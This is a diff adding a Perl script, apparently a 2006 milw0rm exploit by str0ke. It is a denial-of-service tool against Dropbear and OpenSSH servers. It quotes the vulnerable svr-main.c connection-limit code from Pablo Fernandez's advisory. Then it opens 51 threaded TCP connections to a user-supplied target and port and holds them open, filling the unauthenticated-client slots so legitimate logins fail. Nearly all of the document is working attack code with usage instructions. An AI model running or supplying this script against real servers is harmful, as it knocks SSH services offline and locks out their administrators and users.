@@ -1,0 +1,64 @@
+#!/usr/bin/perl
+## I needed a working test script so here it is.
+## just a keep alive thread, I had a few problems with Pablo's code running properly.
+##
+## Straight from Pablo Fernandez's advisory:
+# Vulnerable code is in svr-main.c
+#
+# /* check for max number of connections not authorised */
+# for (j = 0; j < MAX_UNAUTH_CLIENTS; j++) {
+#        if (childpipes[j] < 0) {
+#                break;
+#        }
+# }
+#
+# if (j == MAX_UNAUTH_CLIENTS) {
+#        /* no free connections */
+#        /* TODO - possibly log, though this would be an easy way
+#         * to fill logs/disk */
+#        close(childsock);
+#        continue;
+# }
+## /str0ke (milw0rm.com)
+
+use IO::Socket;
+use Thread;
+use strict;
+
+# thanks to Perl Underground for my moronic coding style fixes.
+my ($serv, $port, $time) = @ARGV;
+
+sub usage
+{
+	print "\nDropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service Exploit\n";
+	print "by /str0ke (milw0rm.com)\n";
+	print "Credits to Pablo Fernandez\n";
+	print "Usage: $0 [Target Domain] [Target Port] [Seconds to hold attack]\n";
+	exit ();
+}
+
+sub exploit
+{
+	my ($serv, $port, $sleep) = @_;
+	my $sock = new IO::Socket::INET ( PeerAddr => $serv,
+	PeerPort => $port,
+	Proto => 'tcp',
+	);
+
+	die "Could not create socket: $!\n" unless $sock;
+	sleep $sleep;
+	close($sock);
+}
+
+sub thread {
+	print "Server: $serv\nPort: $port\nSeconds: $time\n";
+	for my $i ( 1 .. 51 ) {
+		print ".";
+		my $thr = new Thread \&exploit, $serv, $port, $time;
+	}
+	sleep $time; #detach wouldn't be good
+}
+
+if (@ARGV != 3){&usage;}else{&thread;}
+
+# milw0rm.com [2006-03-10]
